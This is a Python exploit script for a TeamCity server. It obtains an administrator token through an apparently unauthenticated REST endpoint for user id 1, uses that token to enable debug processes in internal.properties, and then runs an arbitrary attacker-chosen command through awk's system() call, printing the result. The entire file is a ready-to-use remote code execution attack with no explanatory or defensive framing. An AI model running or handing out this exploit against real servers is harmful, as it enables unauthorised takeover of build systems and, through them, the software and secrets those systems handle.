import requests
import xml.etree.ElementTree as ET
import urllib.parse
import argparse

parser = argparse.ArgumentParser()
parser.add_argument('--url', help='URL of the TeamCity app - http(s)://<IP>:<PORT>', required=True)
parser.add_argument('--command', help='Command to execute', required=True)
args = parser.parse_args()

url = args.url
command = args.command
token = None

requests.delete(f"http://{url}/app/rest/users/id:1/tokens/RPC2")
response = requests.post(f"http://{url}/app/rest/users/id:1/tokens/RPC2")
if response.status_code == 200:
    try:
        root = ET.fromstring(response.text)
        token_value = root.attrib['value']
    except ET.ParseError:
        print("[-] Failed to parse XML response")
        exit(2)
else:
    print("[-] Failed to retrieve token")
    exit(1)

print("[*] Token value: {}".format(token_value))

headers = {
    "Authorization": f"Bearer {token_value}",
    "Content-Type": "text/plain"
}

response = requests.post(
    f"http://{url}/admin/dataDir.html?action=edit&fileName=config/internal.properties&content=rest.debug.processes.enable=true",
    headers=headers
)
if response.status_code == 200:
    print("[+] Successfully edited internal properties")
else:
    print(f"[-] Failed to edit internal properties, status code: {response.status_code}")

response = requests.post(
    'http://{url}/app/rest/debug/processes?exePath=awk&params={parameter}'.format(url=url, parameter=urllib.parse.quote_plus('BEGIN{system("' + command + '")}')),
    headers=headers
)
if response.status_code == 200:
    print("[+] Successfully executed process")
    print("[*] Ouput: \n\n" + response.text)
else:
    print(f"[-] Failed to execute process, status code: {response.status_code}")
